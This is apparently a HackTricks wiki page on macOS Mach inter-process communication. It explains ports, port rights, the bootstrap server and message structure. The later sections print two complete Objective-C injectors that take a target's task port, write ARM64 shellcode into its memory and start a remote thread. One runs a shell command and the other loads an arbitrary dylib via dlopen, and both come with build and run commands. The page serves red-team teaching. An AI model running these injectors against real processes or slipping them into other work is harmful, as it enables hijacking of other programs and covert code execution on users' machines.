# macOS IPC - Inter Process Communication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Mach messaging via Ports

### Basic Information

Mach uses **tasks** as the **smallest unit** for sharing resources, and each task can contain **multiple threads**. These **tasks and threads are mapped 1:1 to POSIX processes and threads**.

Communication between tasks occurs via Mach Inter-Process Communication (IPC), utilising one-way communication channels. **Messages are transferred between ports**, which act like **message queues** managed by the kernel.

Each process has an **IPC table**, in there it's possible to find the **mach ports of the process**. The name of a mach port is actually a number (a pointer to the kernel object).

A process can also send a port name with some rights **to a different task** and the kernel will make this entry in the **IPC table of the other task** appear.

### Port Rights

Port rights, which define what operations a task can perform, are key to this communication. The possible **port rights** are ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Receive right**, which allows receiving messages sent to the port. Mach ports are MPSC (multiple-producer, single-consumer) queues, which means that there may only ever be **one receive right for each port** in the whole system (unlike with pipes, where multiple processes can all hold file descriptors to the read end of one pipe).
  * A **task with the Receive** right can receive messages and **create Send rights**, allowing it to send messages. Originally only the **own task has Receive right over its por**t.
* **Send right**, which allows sending messages to the port.
  * The Send right can be **cloned** so a task owning a Send right can clone the right and **grant it to a third task**.
* **Send-once right**, which allows sending one message to the port and then disappears.
* **Port set right**, which denotes a _port set_ rather than a single port. Dequeuing a message from a port set dequeues a message from one of the ports it contains. Port sets can be used to listen on several ports simultaneously, a lot like `select`/`poll`/`epoll`/`kqueue` in Unix.
* **Dead name**, which is not an actual port right, but merely a placeholder. When a port is destroyed, all existing port rights to the port turn into dead names.

**Tasks can transfer SEND rights to others**, enabling them to send messages back. **SEND rights can also be cloned, so a task can duplicate and give the right to a third task**. This, combined with an intermediary process known as the **bootstrap server**, allows for effective communication between tasks.

### File Ports

File ports allows to encapsulate file descriptors in Mac ports (using Mach port rights). It's possible to create a `fileport` from a given FD using `fileport_makeport` and create a FD froma. fileport using `fileport_makefd`.

### Establishing a communication

#### Steps:

As it's mentioned, in order to establish the communication channel, the **bootstrap server** (**launchd** in mac) is involved.

1. Task **A** initiates a **new port**, obtaining a **RECEIVE right** in the process.
2. Task **A**, being the holder of the RECEIVE right, **generates a SEND right for the port**.
3. Task **A** establishes a **connection** with the **bootstrap server**, providing the **port's service name** and the **SEND right** through a procedure known as the bootstrap register.
4. Task **B** interacts with the **bootstrap server** to execute a bootstrap **lookup for the service** name. If successful, the **server duplicates the SEND right** received from Task A and **transmits it to Task B**.
5. Upon acquiring a SEND right, Task **B** is capable of **formulating** a **message** and dispatching it **to Task A**.
6. For a bi-directional communication usually task **B** generates a new port with a **RECEIVE** right and a **SEND** right, and gives the **SEND right to Task A** so it can send messages to TASK B (bi-directional communication).

The bootstrap server **cannot authenticate** the service name claimed by a task. This means a **task** could potentially **impersonate any system task**, such as falsely **claiming an authorization service name** and then approving every request.

Then, Apple stores the **names of system-provided services** in secure configuration files, located in **SIP-protected** directories: `/System/Library/LaunchDaemons` and `/System/Library/LaunchAgents`. Alongside each service name, the **associated binary is also stored**. The bootstrap server, will create and hold a **RECEIVE right for each of these service names**.

For these predefined services, the **lookup process differs slightly**. When a service name is being looked up, launchd starts the service dynamically. The new workflow is as follows:

* Task **B** initiates a bootstrap **lookup** for a service name.
* **launchd** checks if the task is running and if it isn’t, **starts** it.
* Task **A** (the service) performs a **bootstrap check-in**. Here, the **bootstrap** server creates a SEND right, retains it, and **transfers the RECEIVE right to Task A**.
* launchd duplicates the **SEND right and sends it to Task B**.
* Task **B** generates a new port with a **RECEIVE** right and a **SEND** right, and gives the **SEND right to Task A** (the svc) so it can send messages to TASK B (bi-directional communication).

However, this process only applies to predefined system tasks. Non-system tasks still operate as described originally, which could potentially allow for impersonation.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

The `mach_msg` function, essentially a system call, is utilized for sending and receiving Mach messages. The function requires the message to be sent as the initial argument. This message must commence with a `mach_msg_header_t` structure, succeeded by the actual message content. The structure is defined as follows:

```c
typedef struct {
	mach_msg_bits_t               msgh_bits;
	mach_msg_size_t               msgh_size;
	mach_port_t                   msgh_remote_port;
	mach_port_t                   msgh_local_port;
	mach_port_name_t              msgh_voucher_port;
	mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message. The bitflags in **`msgh_bits`** can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.
{% endhint %}

The other fields of the message header are:

* `msgh_size`: the size of the entire packet.
* `msgh_remote_port`: the port on which this message is sent.
* `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: the ID of this message, which is interpreted by the receiver.

{% hint style="danger" %}
Note that **mach messages are sent over a \_mach port**\_, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.
{% endhint %}

### Enumerate ports

```bash
lsmp -p <pid>
```

You can install this tool in iOS downloading it from [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Code example

Note how the **sender** **allocates** a port, create a **send right** for the name `org.darlinghq.example` and send it to the **bootstrap server** while the sender asked for the **send right** of that name and used it to **send a message**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

    // Create a new port.
    mach_port_t port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_allocate() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("mach_port_allocate() created port right name %d\n", port);


    // Give us a send right to this port, in addition to the receive right.
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_insert_right() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("mach_port_insert_right() inserted a send right\n");


    // Send the send right to the bootstrap server, so that it can be looked up by other processes.
    kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_register() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("bootstrap_register()'ed our port\n");


    // Wait for a message.
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int some_number;
        mach_msg_trailer_t trailer;
    } message;

    kr = mach_msg(
        &message.header,  // Same as (mach_msg_header_t *) &message.
        MACH_RCV_MSG,     // Options. We're receiving a message.
        0,                // Size of the message being sent, if sending.
        sizeof(message),  // Size of the buffer for receiving.
        port,             // The port to receive a message on.
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
    );
    if (kr != KERN_SUCCESS) {
        printf("mach_msg() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Got a message\n");

    message.some_text[9] = 0;
    printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

    // Lookup the receiver port using the bootstrap server.
    mach_port_t port;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_look_up() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("bootstrap_look_up() returned port right name %d\n", port);


    // Construct our message.
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int some_number;
    } message;

    message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    message.header.msgh_remote_port = port;
    message.header.msgh_local_port = MACH_PORT_NULL;

    strncpy(message.some_text, "Hello", sizeof(message.some_text));
    message.some_number = 35;

    // Send the message.
    kr = mach_msg(
        &message.header,  // Same as (mach_msg_header_t *) &message.
        MACH_SEND_MSG,    // Options. We're sending a message.
        sizeof(message),  // Size of the message being sent.
        0,                // Size of the buffer for receiving.
        MACH_PORT_NULL,   // A port to receive a message on, if receiving.
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
    );
    if (kr != KERN_SUCCESS) {
        printf("mach_msg() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Privileged Ports

* **Host port**: If a process has **Send** privilege over this port he can get **information** about the **system** (e.g. `host_processor_info`).
* **Host priv port**: A process with **Send** right over this port can perform **privileged actions** like loading a kernel extension. The **process need to be root** to get this permission.
  * Moreover, in order to call **`kext_request`** API it's needed to have other entitlements **`com.apple.private.kext*`** which are only given to Apple binaries.
* **Task name port:** An unprivileged version of the _task port_. It references the task, but does not allow controlling it. The only thing that seems to be available through it is `task_info()`.
* **Task port** (aka kernel port)**:** With Send permission over this port it's possible to control the task (read/write memory, create threads...).
  * Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) while doing a `fork()`.
  * These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
    * If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
    * Apps with the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
    * **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).

### Shellcode Injection in thread via Task port

You can grab a shellcode from:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
    double result = 0;
    for (int i = 0; i < 10000; i++) {
        result += sqrt(i) * tan(i) - cos(i);
    }
    return result;
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
        while (true) {
            [NSThread sleepForTimeInterval:5];

            performMathOperations();  // Silent action

            [NSThread sleepForTimeInterval:5];
        }
    }
    return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.get-task-allow</key>
    <true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compile** the previous program and add the **entitlements** to be able to inject code with the same user (if not you will need to use **sudo**).

<details>

<summary>sc_injector.m</summary>

```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

    task_t remoteTask;

    // Get access to the task port of the process we want to inject into
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
        return (-1);
    }
    else{
        printf("Gathered privileges over the task port of process: %d\n", pid);
    }

    // Allocate memory for the stack
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else
    {

        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }
    
    // Allocate memory for the code
    remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    

    // Write the shellcode to the allocated memory
    kr = mach_vm_write(remoteTask,                   // Task port
	                   remoteCode64,                 // Virtual Address (Destination)
	                   (vm_address_t) injectedCode,  // Source
	                    0xa9);                       // Length of the source


    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
	return (-3);
    }


    // Set the permissions on the allocated code memory
    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
	return (-4);
    }

    // Set the permissions on the allocated stack memory
    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
	
    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
	return (-4);
    }

    // Create thread to run shellcode
    struct arm_unified_thread_state remoteThreadState64;
    thread_act_t         remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
        //remoteStack64 -= 8;  // need alignment of 16

    const char* p = (const char*) remoteCode64;

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

    if (kr != KERN_SUCCESS) {
        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
        return (-3);
    }

    return (0);
}

pid_t pidForProcessName(NSString *processName) {
    NSArray *arguments = @[@"pgrep", processName];
    NSTask *task = [[NSTask alloc] init];
    [task setLaunchPath:@"/usr/bin/env"];
    [task setArguments:arguments];

    NSPipe *pipe = [NSPipe pipe];
    [task setStandardOutput:pipe];

    NSFileHandle *file = [pipe fileHandleForReading];

    [task launch];

    NSData *data = [file readDataToEndOfFile];
    NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

    return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
    NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
    NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
    return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        if (argc < 2) {
            NSLog(@"Usage: %s <pid or process name>", argv[0]);
            return 1;
        }

        NSString *arg = [NSString stringWithUTF8String:argv[1]];
        pid_t pid;

        if (isStringNumeric(arg)) {
            pid = [arg intValue];
        } else {
            pid = pidForProcessName(arg);
            if (pid == 0) {
                NSLog(@"Error: Process named '%@' not found.", arg);
                return 1;
            }
            else{
                printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
            }
        }

        inject(pid);
    }

    return 0;
}
```

</details>

```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```

### Dylib Injection in thread via Task port

In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previous injection, was generated using Mach api, so **it's not posix compliant**.

It was possible to **inject a simple shellcode** to execute a command because it **didn't need to work with posix** compliant apis, only with Mach. **More complex injections** would need the **thread** to be also **posix compliant**.

Therefore, to **improve the thread** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load a dylib** from the system, so instead of writing new shellcode to perform different actions it's possible to load custom libraries.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>

```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

    // "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

    // Call pthread_set_self

    "\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
    "\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
    "\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
    "\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the 
    "\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
    "\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
    "\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
    "\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
    "\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
    "\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
    "\x00\x00\x00\x14" // loop: b loop              ; loop forever

    // Call dlopen with the path to the library
    "\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
    "\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
    "\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
    "\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
    "\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
    
    // Call pthread_exit
    "\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
    "\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
    "\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
    
    "PTHRDCRT"  // <-
    "PTHRDEXT"  // <-
    "DLOPEN__"  // <- 
    "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB" 
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

    task_t remoteTask;
    struct stat buf;

    // Check if the library exists
    int rc = stat (lib, &buf);

    if (rc != 0)
    {
        fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
        //return (-9);
    }

    // Get access to the task port of the process we want to inject into
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
        return (-1);
    }
    else{
        printf("Gathered privileges over the task port of process: %d\n", pid);
    }

    // Allocate memory for the stack
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else
    {

        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }
    
    // Allocate memory for the code
    remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }

 
    // Patch shellcode

    int i = 0;
    char *possiblePatchLocation = (injectedCode );
    for (i = 0 ; i < 0x100; i++)
    {

        // Patching is crude, but works.
        //
        extern void *_pthread_set_self;
        possiblePatchLocation++;

        
        uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
        uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
        uint64_t addrOfDlopen = (uint64_t) dlopen;

        if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
        {
            memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
            printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
        }

        if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
        {
            memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
            printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
        }

        if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
        {
            printf ("DLOpen @%llx\n", addrOfDlopen);
            memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
        }

        if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
        {
            strcpy(possiblePatchLocation, lib );
        }
    }

	// Write the shellcode to the allocated memory
    kr = mach_vm_write(remoteTask,                   // Task port
	                   remoteCode64,                 // Virtual Address (Destination)
	                   (vm_address_t) injectedCode,  // Source
	                    0xa9);                       // Length of the source


    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
        return (-3);
    }


    // Set the permissions on the allocated code memory
    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
        return (-4);
    }

    // Set the permissions on the allocated stack memory
    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
	
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
        return (-4);
    }


    // Create thread to run shellcode
    struct arm_unified_thread_state remoteThreadState64;
    thread_act_t         remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
        //remoteStack64 -= 8;  // need alignment of 16

    const char* p = (const char*) remoteCode64;

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

    if (kr != KERN_SUCCESS) {
        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
        return (-3);
    }

    return (0);
}



int main(int argc, const char * argv[])
{
    if (argc < 3)
	{
		fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
		fprintf (stderr, "   _action_: path to a dylib on disk\n");
		exit(0);
	}

    pid_t pid = atoi(argv[1]);
    const char *action = argv[2];
    struct stat buf;

    int rc = stat (action, &buf);
    if (rc == 0) inject(pid,action);
    else
    {
        fprintf(stderr,"Dylib not found\n");
    }

}
```

</details>

```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```

### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In this technique a thread of the process is hijacked:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. It basically **generates the needed code** for server and client to communicate with a given definition. Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

